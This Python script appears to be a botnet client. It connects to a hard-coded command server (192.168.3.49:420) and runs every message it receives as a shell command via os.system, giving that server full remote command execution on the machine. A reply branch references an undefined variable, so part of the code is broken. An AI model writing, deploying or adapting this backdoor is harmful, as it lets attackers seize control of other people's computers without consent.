import socket
import random
from threading import Thread
import os


SERVER_HOST = "192.168.3.49"
SERVER_PORT = 420


s = socket.socket()
print(f"[*] Connecting to {SERVER_HOST}:{SERVER_PORT}...")
s.connect((SERVER_HOST, SERVER_PORT))
print("[+] Connected.")


bot_number = input(f"What bot number is this?: ")


def listen_for_messages():
    while True:
        message = s.recv(1024).decode()
        if "!connected!" in message:
            connected_bots = f"{name}: connected \n"
            s.send(connected_bots.encode())
        else:
            os.system(f"{message}")


t = Thread(target=listen_for_messages)
t.daemon = True
t.start()



while True:
    to_send =  input()
    if to_send.lower() == 'q':
        break
    to_send = f"bot-{bot_number}: {to_send}"
    s.send(to_send.encode())


s.close()



